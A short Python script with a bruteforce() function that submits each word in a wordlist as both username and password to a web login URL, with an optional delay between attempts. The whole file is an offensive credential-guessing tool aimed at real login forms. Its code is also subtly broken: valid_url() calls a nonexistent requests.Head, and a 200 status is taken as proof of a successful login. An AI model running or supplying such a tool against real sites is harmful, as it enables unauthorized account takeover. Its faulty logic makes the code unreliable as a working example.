import requests
import time

def bruteforce(url, words=None, cooldown=0):
    if not url:
        print("Please enter a URL to bruteforce.")
        return None

    if not valid_url(url):
        print("Invalid URL format. Please enter a valid URL.")
        return None

    if words:
        for word in words:
            payload = {
                'username': word,
                'password': word
            }

            try:
                response = requests.post(url, data=payload)

                if response.status_code == 200:
                    print(f'Success: {word}')
                    return word

                if cooldown > 0:
                    time.sleep(cooldown)

            except requests.exceptions.RequestException as e:
                print(f"Error: {e}")
                response = input("Do you want to try again or enter a new URL? (t/n) ")
                if response.lower() == 't':
                    return bruteforce(url, words, cooldown)
                else:
                    return None

    print('Bruteforce failed')
    return None

def valid_url(url):
    """Check if the URL is valid"""
    try:
        result = requests.Head(url)
        return result.status_code < 400
    except requests.exceptions.RequestException:
        return False